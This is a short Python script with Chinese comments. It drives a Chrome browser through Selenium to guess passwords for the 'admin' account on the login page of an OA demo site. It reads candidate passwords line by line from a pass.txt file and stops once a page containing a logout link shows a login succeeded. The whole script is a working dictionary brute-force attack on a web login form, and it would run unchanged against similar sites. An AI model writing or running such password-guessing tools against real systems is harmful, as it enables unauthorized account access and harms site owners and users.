import time

import selenium
import selenium.webdriver


def login_oa(username,password):
    driver = selenium.webdriver.Chrome()
    driver.get('http://demo.smeoa.com')
    time.sleep(2)

    #  输入账户密码文本框 ，输入账户密码
    user_text =driver.find_element_by_id('emp_no')
    password_text = driver.find_element_by_id('password')
    time.sleep(1)
    user_text.send_keys(username)
    password_text.send_keys(password)
    time.sleep(1)

    # 找到按钮 模拟登录
    login = driver.find_element_by_id('login_btn')
    login.click()
    time.sleep(1)

    # 打印 抓取到的页面
    # print(driver.page_source)

    # 找到网页的退出 判断是否登录成功
    is_login = driver.page_source.find('退出') != -1
    # True
    time.sleep(5)
    driver.close()
    return is_login

# print(login_oa('admin','admin'))


pass_file = open('./pass.txt', 'r')
while True:
    #  循环 读取每一行
    pass_line = pass_file.readline()
    #  没有就退出循环
    if not pass_line:
        break
    # 拆分
    pass_list = pass_line.split(' # ')
    # 调用登录函数
    is_login = login_oa('admin',pass_list[0])

    print(pass_list[0], is_login)

    # 登录成功 结束循环
    if is_login:
        break

